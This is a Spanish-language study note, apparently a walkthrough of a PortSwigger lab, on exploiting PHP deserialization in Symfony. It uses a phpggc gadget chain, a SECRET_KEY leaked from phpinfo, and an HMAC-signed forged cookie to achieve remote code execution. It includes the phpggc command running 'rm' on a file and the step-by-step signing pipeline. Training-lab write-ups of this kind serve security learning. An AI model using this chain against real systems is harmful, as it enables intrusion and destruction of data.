---
aliases:
  - Deser 006 - PHP phpggc pre-built chain
  - Symfony RCE4 phpggc HMAC
tags:
  - vuln/insecure-deserialization
  - example
  - portswigger
---

# 006 — PHP con gadget chain pre-armado (phpggc + firma HMAC) ⭐

> Lab: [Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain) · **Practitioner** · técnica → [[vulnerabilities/013-insecure_deserialization/insecure-deserialization|entry point]]

## Ficha
- **Objeto:** PHP serializado (framework **Symfony**).
- **Codificación (varias capas):** serial → `base64` → **JSON con firma HMAC-SHA1** → `base64` → `url`.
- **Herramienta:** **phpggc** (chain `Symfony/RCE4`) + firma con la SECRET_KEY filtrada.
- **Efecto:** **RCE** → `rm /home/carlos/morale.txt`.

## Paso 1 — generar el objeto (phpggc)
```
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' -b
```
`-b` = salida en **base64**. En el vault: [`scripts/PHP/gen_rce_oast.py`](vulnerabilities/013-insecure_deserialization/scripts/PHP/gen_rce_oast.py) (Python, arma el comando de exfil por OAST) o [`scripts/PHP/gen-payload.ps1`](vulnerabilities/013-insecure_deserialization/scripts/PHP/gen-payload.ps1) (PS, corre phpggc en Docker).

## Paso 2 — filtrar la SECRET_KEY
La cookie va **firmada**; sin la clave, el server la rechaza. Se filtra en un debug expuesto:
> `GET /cgi-bin/phpinfo.php` → contiene `SECRET_KEY`

## Paso 3 — armar y firmar la cookie
La cookie es un JSON con el objeto y su **HMAC-SHA1**:

> `{"token":"`==`<base64 de phpggc>`==`","sig_hmac_sha1":"`==`<hmac_sha1(token, SECRET_KEY)>`==`"}`

Ese JSON completo → `base64` → `url-encode` → cookie. En el vault: [`scripts/PHP/sign-cookie.ps1`](vulnerabilities/013-insecure_deserialization/scripts/PHP/sign-cookie.ps1) hace la firma y el encoding final.

## El pipeline completo (lo importante)
> `phpggc` **⟶** ==`base64`== (token) **⟶** `{"token":…,"sig_hmac_sha1":…}` **⟶** ==`base64`== **⟶** ==`url`== **⟶** cookie

## Por qué funciona
- Symfony deserializa la cookie **si la firma valida** → por eso hace falta la `SECRET_KEY`.
- Con la clave, vos firmás **tu** objeto malicioso → pasa la verificación → se deserializa → **RCE** por el gadget de Symfony.

## Detalles que se pasan por alto
- **Sin la SECRET_KEY no hay nada** → primero cazá el phpinfo/config filtrado.
- Cuidá el **whitespace**: si el base64 del token trae saltos de línea, la firma sale mal (el script los limpia).

→ Siguiente: [[vulnerabilities/013-insecure_deserialization/examples/007-ruby-gadget-documentado|007 · Ruby · Marshal]]
